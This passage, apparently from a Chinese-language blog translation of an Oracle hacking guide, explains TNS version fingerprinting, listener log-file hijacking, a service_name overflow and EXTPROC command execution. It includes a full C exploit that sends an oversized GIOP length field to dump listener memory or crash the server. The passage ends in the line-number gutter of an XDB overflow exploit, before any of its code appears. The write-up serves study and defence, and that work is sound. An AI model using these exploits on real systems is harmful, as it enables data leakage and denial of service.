class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 181</span><br><span class="line">      Identifier: 13914</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0x41e5</span><br><span class="line">      Source IP: 192.168.0.120</span><br><span class="line">      Dest IP: 192.168.0.59</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 1521</span><br><span class="line">      Dest port: 3004</span><br><span class="line">      Sequence: 1152664576</span><br><span class="line">      ack: 2478634793</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH)</span><br><span class="line">      Window Size: 17451</span><br><span class="line">      Checksum: 0xcae1</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      00 8d 00 00 04 00 00 00 22 00 00 81 28 44 45 53          &quot;   (DES</span><br><span class="line">      43 52 49 50 54 49 4f 4e 3d 28 45 52 52 3d 31 31  CRIPTION=(ERR=11</span><br><span class="line">      35 33 29 28 56 53 4e 4e 55 4d 3d 31 36 39 38 36  53)(VSNNUM=16986</span><br><span class="line">      39 35 36 38 29 28 45 52 52 4f 52 5f 53 54 41 43  9568)(ERROR_STAC</span><br><span class="line">      4b 3d 28 45 52 52 4f 52 3d 28 43 4f 44 45 3d 31  K=(ERROR=(CODE=1</span><br><span class="line">      31 35 33 29 28 45 4d 46 49 3d 34 29 28 41 52 47  153)(EMFI=4)(ARG</span><br><span class="line">      53 3d 27 75 6e 62 72 65 61 6b 61 62 6c 65 27 29  S=&#x27;unbreakable&#x27;)</span><br><span class="line">      29 28 45 52 52 4f 52 3d 28 43 4f 44 45 3d 33 30  )(ERROR=(CODE=30</span><br><span class="line">      33 29 28 45 4d 46 49 3d 31 29 29 29 29           3)(EMFI=1))))</span><br></pre></td></tr></table></figure><h4 id="利用TNS的TTC功能"><a href="#利用TNS的TTC功能" class="headerlink" title="利用TNS的TTC功能"></a>利用TNS的TTC功能</h4><p>​        我们之前讨论了TTC功能，并提到了版本功能0x3B。 这将导致Oracle服务器在认证之前显示其版本。</p><p>​        <strong>使用其他网络选项协商</strong></p><p>​        客户端从服务器接收到“接受”数据包后，客户端可以选择协商其他网络服务，例如身份验证，加密，数据完整性和管理程序。 可以在ANO协商标头（0xDEADBEEF）后三个字节找到客户端或服务器的版本-数据包中的17个字节。 在以下数据中，可以看到版本为8.1.7.4：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 203</span><br><span class="line">      Identifier: 14473</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0x3fa0</span><br><span class="line">      Source IP: 192.168.0.59</span><br><span class="line">      Dest IP: 192.168.0.120</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 4194</span><br><span class="line">      Dest port: 1495</span><br><span class="line">      Sequence: 422372252</span><br><span class="line">      ack: 597087647</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH)</span><br><span class="line">      Window Size: 65087</span><br><span class="line">      Checksum: 0x7e36</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      00 a3 00 00 06 00 00 00 00 00 de ad be ef 00 99</span><br><span class="line">      08 10 74 00 00 04 00 00 04 00 03 00 00 00 00 00    t</span><br><span class="line">      04 00 05 08 10 74 00 00 02 00 06 00 1f 00 0e 00       t</span><br><span class="line">      01 de ad be ef 00 03 00 00 00 02 00 04 00 01 00</span><br><span class="line">      01 00 07 00 00 00 00 00 04 00 05 08 10 74 00 00              t</span><br><span class="line">      02 00 06 fa ff 00 01 00 02 01 00 03 00 00 4e 54               NT</span><br><span class="line">      53 00 04 00 05 02 00 00 00 00 04 00 04 00 00 00  S</span><br><span class="line">      00 00 04 00 04 00 00 00 02 00 02 00 02 00 00 00</span><br><span class="line">      00 00 04 00 05 08 10 74 00 00 01 00 02 00 00 03        t</span><br><span class="line">      00 02 00 00 00 00 00 04 00 05 08 10 74 00 00 01             t</span><br><span class="line">      00 02 00</span><br></pre></td></tr></table></figure><h2 id="攻击TNS侦听器和调度程序"><a href="#攻击TNS侦听器和调度程序" class="headerlink" title="攻击TNS侦听器和调度程序"></a>攻击TNS侦听器和调度程序</h2><p>​        TNS侦听器是所有Oracle通信的枢纽。</p><h3 id="TNS劫持攻击"><a href="#TNS劫持攻击" class="headerlink" title="TNS劫持攻击"></a>TNS劫持攻击</h3><p>​        10g之前的TNS侦听器可以直接进行远程管理，而无需提供密码。 由于可以指定日志文件和跟踪文件的位置，因此攻击者可以将日志文件设置为例如Windows管理员启动文件夹中的批处理文件或Oracle用户主目录中的.rhosts文件。Linux上的目录。 设置好之后，攻击者可以发送命令运行，或者在Linux上发送“ + +”命令，使这些命令执行，或者能够使用r *服务以Oracle用户身份运行命令。 </p><p>​        除了能够设置密码来管理侦听器外，Oracle还向侦听器添加了另一个选项-ADMIN_RESTRICTIONS。 启用后，某些命令（例如更改日志文件的位置）只能在本地执行。 有关详细信息，请访问<a href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html%E3%80%82">www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html。</a></p><p>​        除此之外，TNS侦听器还遭受许多缓冲区溢出漏洞的困扰。 例如，在2002年6月，Oracle解决了9i中的一个溢出问题，该溢出中过长的service_name参数将触发该问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(DESCRIPTION=(ADDRESS=</span><br><span class="line">(PROTOCOL=TCP)(HOST=192.168.0.65)</span><br><span class="line">(PORT=1521))(CONNECT_DATA=</span><br><span class="line">(SERVICE_NAME=shellcode_goes_here) </span><br><span class="line">(CID=</span><br><span class="line">(PROGRAM=SQLPLUS.EXE)</span><br><span class="line">(HOST=foo)(USER=bar))))</span><br></pre></td></tr></table></figure><p>​        发生错误是因为在将错误写入日志文件时，用户提供的service_name被复制到基于堆栈的缓冲区中。 攻击者可能利用此漏洞来控制流程的执行路径。</p><p>​        可以在没有用户ID和密码的情况下针对TNS侦听器发动的另一种攻击，将诱使服务器加载任意库并执行任意功能。对于Oracle 8.1.7.4，它仍未打补丁，尽管存在严重的安全隐患，Oracle仍拒绝对其进行修复。攻击方法包括连接到侦听器并请求访问EXTPROC，EXTPROC是用于运行PLSQL外部过程的程序。因为没有身份验证，并且因为可以通过TCP到达EXTPROC，所以可以加载例如msvcrt.dll或libc，并执行system（）函数和任意操作系统命令。对于Oracle 9和更高版本，Oracle制作了一个补丁程序，但该补丁程序存在缓冲区溢出漏洞。该补丁添加了代码，以捕获攻击者尝试远程加载库然后进行记录的记录，但是记录代码使用了sprintf（）。通过提供一个过长的库名，基于堆栈的缓冲区可能会溢出，从而使攻击者获得控制权。第二个补丁不是很好。通过将环境变量嵌入库名称中，可以通过长度检查。此后，环境变量将被扩展，从而推出了用户提供的字符串的长度。同样，可能会使缓冲区溢出。</p><h3 id="攻击-GIOP服务器"><a href="#攻击-GIOP服务器" class="headerlink" title="攻击 GIOP服务器"></a>攻击 GIOP服务器</h3><p>​        默认情况下，Oracle 9.0.1和Oracle 8.1.7.4都安装了IIOP（Internet内部对象请求代理协议）服务器以启用对CORBA应用程序的访问。 IIOP是GIOP（公用对象请求代理协议）的实现。该服务器中的漏洞可能允许攻击者通过网络从服务器中转储任意内存或使服务器崩溃。 </p><p>​        GIOP数据包的标头有一个size，它指示客户端正在发送多少数据。服务器使用此大小参数来构建其响应。如果客户端发送的大小大于其实际发送的数据，则服务器将读取内存中的数据，直到攻击者指定的大小为止。这样，攻击者就可以开始泄漏TNS侦听器的内存内容。如果大小足够大，则侦听器最终会尝试读取未初始化的内存，并且访问会导致拒绝服务。以下代码演示了这一点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;winsock.h&gt;</span><br><span class="line"></span><br><span class="line">int SendGIOPPacket(void);</span><br><span class="line">int StartWinsock(void);</span><br><span class="line">int packet_length(char *);</span><br><span class="line">int PrintResponse(unsigned char *p, int 1);</span><br><span class="line">int bswap_i(unsigned int);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct sockaddr_in s_sa;</span><br><span class="line">struct hostent *he;</span><br><span class="line">unsigned int addr;</span><br><span class="line">int IIOPPort=2481;</span><br><span class="line">char host[260]=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">int PKT_LEN = 148;</span><br><span class="line"></span><br><span class="line">unsigned char GIOPPacketHeader[2000]=</span><br><span class="line">&quot;\x47\x49\x4f\x50&quot;      // MAGIC</span><br><span class="line">&quot;\x01\x00&quot;            // VERSION</span><br><span class="line">&quot;\x00&quot;                  // BYTE ORDER</span><br><span class="line">&quot;\x00&quot;                  // MSG_TYPE</span><br><span class="line">&quot;\x00\x00\x00\x82&quot;      // MSG_SIZE</span><br><span class="line">&quot;\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x01\x00\x00\x00&quot;</span><br><span class="line">&quot;\x00\x00\xFF\xFF&quot;;      // SIZE</span><br><span class="line"></span><br><span class="line">unsigned char GIOPPacketTail[]=</span><br><span class="line">&quot;\x00&quot;</span><br><span class="line">&quot;\x49\x4e\x49\x54&quot;</span><br><span class="line">&quot;\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x00\x04&quot;</span><br><span class="line">&quot;\x67\x65\x74\x00&quot;</span><br><span class="line">&quot;\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x00\x0c&quot;</span><br><span class="line">&quot;\x4e\x61\x6d\x65\x53\x65\x72\x76\x69\x63\x65\x00&quot;;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">      unsigned int ErrorLevel=0, bytes = 0;</span><br><span class="line">      unsigned short len=0;</span><br><span class="line">      int count = 0;</span><br><span class="line">      unsigned char sid[100]=&quot;&quot;;</span><br><span class="line">      unsigned char buffer[512]=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">      if(argc !=4)</span><br><span class="line">            return printf(&quot;%s HOST SID BYTES\n&quot;,argv[0]);</span><br><span class="line"></span><br><span class="line">      strncpy(host,argv[1],256);</span><br><span class="line">      strncpy(sid,argv[2],96);</span><br><span class="line">      bytes = atoi(argv[3]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_snprintf(buffer,508,&quot;ORCL(CONNECT_DATA=(REP_ID=IDL:CORBA/InitialReferen</span><br><span class="line">ces:1.0)(SID=%s)(SESSION_ID=0))&quot;,sid);</span><br><span class="line"></span><br><span class="line">      len = (unsigned short)strlen(sid)+0x82;</span><br><span class="line">      PKT_LEN = len + 0xC;</span><br><span class="line"></span><br><span class="line">      bytes = bswap_i(bytes);</span><br><span class="line">      memmove(&amp;GIOPPacketHeader[24],&amp;bytes,4);</span><br><span class="line">      memmove(&amp;GIOPPacketHeader[28],buffer,strlen(buffer));</span><br><span class="line">      memmove(&amp;GIOPPacketHeader[28+strlen(buffer)],GIOPPacketTail,35);</span><br><span class="line"></span><br><span class="line">      GIOPPacketHeader[11]=(unsigned char)len;</span><br><span class="line">      len = len &lt;&lt; 8;</span><br><span class="line">      GIOPPacketHeader[10]=(unsigned char)len;</span><br><span class="line"></span><br><span class="line">      if(StartWinsock()==0)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;Error starting Winsock.\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      SendGIOPPacket();</span><br><span class="line"></span><br><span class="line">      return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int bswap_i(unsigned int v)</span><br><span class="line">&#123;</span><br><span class="line">      __asm &#123;</span><br><span class="line">            xor eax, eax</span><br><span class="line">            mov eax,v</span><br><span class="line">            bswap eax</span><br><span class="line">            mov v, eax</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">      return v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int StartWinsock()</span><br><span class="line">&#123;</span><br><span class="line">      int err=0;</span><br><span class="line">      WORD wVersionRequested;</span><br><span class="line">      WSADATA wsaData;</span><br><span class="line"></span><br><span class="line">      wVersionRequested = MAKEWORD( 2, 0 );</span><br><span class="line">      err = WSAStartup(wVersionRequested, &amp;wsaData );</span><br><span class="line">      if ( err != 0 )</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE(wsaData.wVersion )</span><br><span class="line">!= 0 )</span><br><span class="line">        &#123;</span><br><span class="line">            WSACleanup( );</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if (isalpha(host[0]))</span><br><span class="line">            he = gethostbyname(host);</span><br><span class="line"></span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">            addr = inet_addr(host);</span><br><span class="line">            he = gethostbyaddr((char *)&amp;addr,4,AF_INET);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if (he == NULL)</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      s_sa.sin_addr.s_addr=INADDR_ANY;</span><br><span class="line">      s_sa.sin_family=AF_INET;</span><br><span class="line">      memcpy(&amp;s_sa.sin_addr,he-&gt;h_addr,he-&gt;h_length);</span><br><span class="line">      return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int SendGIOPPacket(void)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      SOCKET c_sock;</span><br><span class="line"></span><br><span class="line">      unsigned char resp[10000]=&quot;&quot;;</span><br><span class="line">      int snd=0,rcv=0,count=0, var=0;</span><br><span class="line">      unsigned int ttlbytes=0;</span><br><span class="line">      unsigned int to=2000;</span><br><span class="line">      struct sockaddr_in        srv_addr,cli_addr;</span><br><span class="line">      SOCKET            cli_sock;</span><br><span class="line">      unsigned int size = 0;</span><br><span class="line">      char *buf = NULL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      cli_sock=socket(AF_INET,SOCK_STREAM,0);</span><br><span class="line">      if (cli_sock==INVALID_SOCKET)</span><br><span class="line">            return printf(&quot;sock error&quot;);</span><br><span class="line"></span><br><span class="line">      s_sa.sin_port=htons((unsigned short)IIOPPort);</span><br><span class="line"></span><br><span class="line">      if</span><br><span class="line">(connect(cli_sock,(LPSOCKADDR)&amp;s_sa,sizeof(s_sa))==SOCKET_ERROR)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;Connect error %d&quot;,GetLastError());</span><br><span class="line">            return closesocket(cli_sock);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      buf = malloc(264);</span><br><span class="line">      if(!buf)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;malloc failed.\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      memset(buf,0,264);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      snd=send(cli_sock, GIOPPacketHeader , PKT_LEN , 0);</span><br><span class="line">      while(rcv !=SOCKET_ERROR)</span><br><span class="line">      &#123;</span><br><span class="line">            rcv = recv(cli_sock,resp,260,0);</span><br><span class="line">            if(rcv == 0||rcv ==SOCKET_ERROR)</span><br><span class="line">                  break;</span><br><span class="line"></span><br><span class="line">            memmove(&amp;buf[size],resp,rcv);</span><br><span class="line">            size = size + rcv;</span><br><span class="line">            buf = realloc(buf,size+260);</span><br><span class="line">            if(!buf)</span><br><span class="line">            &#123;</span><br><span class="line">                  printf(&quot;realloc failed.\n&quot;);</span><br><span class="line">                  closesocket(cli_sock);</span><br><span class="line">                  return 0;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      PrintResponse(buf,size);</span><br><span class="line">      closesocket(cli_sock);</span><br><span class="line">      return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int PrintResponse(unsigned char *ptr,int size)</span><br><span class="line">&#123;</span><br><span class="line">      int count = 0;</span><br><span class="line">      int chk = 0;</span><br><span class="line">      int sp = 0;</span><br><span class="line">      printf(&quot;%.4X   &quot;,count);</span><br><span class="line">      while(count &lt; size)</span><br><span class="line">      &#123;</span><br><span class="line">            if(count % 16 == 0 &amp;&amp; count &gt; 0)</span><br><span class="line">            &#123;</span><br><span class="line">                  printf(&quot;   &quot;);</span><br><span class="line">                  chk = count;</span><br><span class="line">                  count = count - 16;</span><br><span class="line">                  while(count &lt; chk)</span><br><span class="line">                  &#123;</span><br><span class="line">                        if(ptr[count]&lt;0x20)</span><br><span class="line">                              printf(&quot;.&quot;);</span><br><span class="line">                        else</span><br><span class="line">                              printf(&quot;%c&quot;,ptr[count]);</span><br><span class="line">                        count ++;</span><br><span class="line">                  &#125;</span><br><span class="line">                  printf(&quot;\n%.4X   &quot;,count);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            printf(&quot;%.2X &quot;,ptr[count]);</span><br><span class="line">            count ++;</span><br><span class="line">      &#125;</span><br><span class="line">      count = count - chk;</span><br><span class="line">      count = 17 - count;</span><br><span class="line">      while(sp &lt; count)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;    &quot;);</span><br><span class="line">            sp++;</span><br><span class="line">      &#125;</span><br><span class="line">      count = chk;</span><br><span class="line">      while(count &lt; size)</span><br><span class="line">      &#123;</span><br><span class="line">            if(ptr[count]&lt;0x20)</span><br><span class="line">                  printf(&quot;.&quot;);</span><br><span class="line">            else</span><br><span class="line">                  printf(&quot;%c&quot;,ptr[count]);</span><br><span class="line">            count ++;</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;\n\n\n\n&quot;);</span><br><span class="line">      return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="XML数据库"><a href="#XML数据库" class="headerlink" title="XML数据库"></a>XML数据库</h3><p>​        XML数据库（也称为XDB）提供两种服务：一种在TCP端口8080上通过HTTP提供服务，另一种在TCP端口2100上基于FTP的服务。过去，XDB遭受了许多缓冲区溢出漏洞的困扰，包括身份验证机制中的溢出（用户名或密码过长）。 以下代码利用了在Linux上运行的XDB 9.2.0.1上的UNLOCK溢出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span 